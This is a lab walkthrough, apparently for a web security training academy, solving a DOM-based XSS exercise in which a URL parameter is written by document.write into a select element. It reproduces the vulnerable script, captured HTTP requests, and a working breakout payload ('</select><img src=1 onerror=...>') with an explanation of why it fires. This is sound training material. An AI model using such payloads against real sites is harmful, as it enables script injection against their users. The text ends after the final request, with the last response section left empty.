## Lab 10 : DOM XSS in document.write sink using source location.search inside a select element

Captured request by clicking first product .

#### 📤 Request
```http
GET /product?productId=1 HTTP/2
Host: 0a0e00a40402d2e080582176001200ee.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0e00a40402d2e080582176001200ee.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Vulnerable JS code found .

#### 📤 Response
```http
<script>
                                var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
                                document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
                                for(var i=0;i<stores.length;i++) {
                                    if(stores[i] === store) {
                                        continue;
                                    }
                                    document.write('<option>'+stores[i]+'</option>');
                                }
                                document.write('</select>');
                            </script>
                            <select name="storeId"><option>London</option><option>Paris</option><option>Milan</option></select>
```

I inserted a random alphanumeric string in `storeId` variable to see how it stores value.

#### 📤 Request
```http
GET /product?productId=1&storeId=abc123 HTTP/2
```
It got inserted like this

#### 📤 Response
```http
<select name="storeId"><option selected="">abc123</option><option>London</option><option>Paris</option><option>Milan</option></select>
```

**Here `store` isn't sitting inside quotes as JavaScript data, it's sitting as literal text content between two HTML tags (`<option selected>` and `</option>`). This means no breakout syntax, no operators, no quote-escaping tricks needed — whatever we put in `storeId` becomes raw markup the browser parses as DOM.**

So in `storeId` parameter we can insert this payload `</select><img src=1 onerror=alert(document.domain)>` . 

It looks something like this .
```text
<select name="storeId"><option selected></select><img src=1 onerror=alert(document.domain)></option>...
```
The `</select>` closing tag ends the select element early, so the `<img>` now sits outside it, in a normal document position where the parser's select-specific content restriction no longer applies. The browser renders it as a real `<img>` tag, the broken src=1 fails to load, onerror fires, and alert(document.domain) runs.

#### 📤 Request
```http
GET /product?productId=1&storeId=</select><img src=1 onerror=alert(document.domain)> HTTP/2
```

#### 📤 Response
